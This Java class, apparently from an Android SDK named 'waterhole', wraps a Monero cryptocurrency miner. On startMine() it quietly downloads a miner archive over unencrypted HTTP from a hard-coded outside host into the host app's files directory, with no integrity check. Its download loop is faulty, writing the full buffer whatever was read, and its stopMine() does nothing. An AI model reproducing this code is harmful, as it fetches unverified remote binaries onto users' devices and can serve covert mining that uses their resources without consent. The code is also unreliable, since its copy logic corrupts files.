package waterhole.miner.monero;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectStreamException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

import waterhole.miner.core.AbstractMiner;

import static waterhole.miner.core.asyn.AsyncTaskAssistant.executeOnThreadPool;
import static waterhole.miner.core.utils.LogUtils.error;
import static waterhole.miner.core.utils.IOUtils.closeSafely;
import static waterhole.miner.core.utils.LogUtils.info;

/**
 * 门罗挖矿类，对外提供，挖新版门罗，旧版门罗，自动切换门罗挖矿功能。
 *
 * @author kzw on 2018/05/16.
 */
public final class MoneroMiner extends AbstractMiner {

    private static final String TAG = "Waterhole-XmrMiner";

    private static final String OLD_MINER_DOWNLOAD_URL = "http://eidon.top:8000/xmr-miner-old.zip";

    private MoneroMiner() {
    }

    public static MoneroMiner instance() {
        return Holder.instance;
    }

    private static class Holder {
        static MoneroMiner instance = new MoneroMiner();
    }

    private Object readResolve() throws ObjectStreamException {
        return instance();
    }

    @Override
    public void startMine() {
        if (getContext() == null) {
            throw new RuntimeException("please call setContext() first");
        }
        executeOnThreadPool(new Runnable() {
            @Override
            public void run() {
                downloadOldMinerIfNotExist();
            }
        });
    }

    private void downloadOldMinerIfNotExist() {
        OutputStream output = null;
        try {
            URL url = new URL(OLD_MINER_DOWNLOAD_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            String pathName = getContext().getFilesDir().getAbsolutePath() + "/xmr-miner-old.zip";
            File file = new File(pathName);
            if (file.exists()) {
                return;
            }
            InputStream input = conn.getInputStream();
            output = new FileOutputStream(file);
            byte[] buffer = new byte[4 * 1024];
            while (input.read(buffer) != -1) {
                output.write(buffer);
            }
            output.flush();
            info(TAG, "download old miner success");
        } catch (MalformedURLException e) {
            error(TAG, e.getMessage());
        } catch (IOException e) {
            error(TAG, e.getMessage());
        } finally {
            closeSafely(output);
        }
    }

    @Override
    public void stopMine() {

    }
}
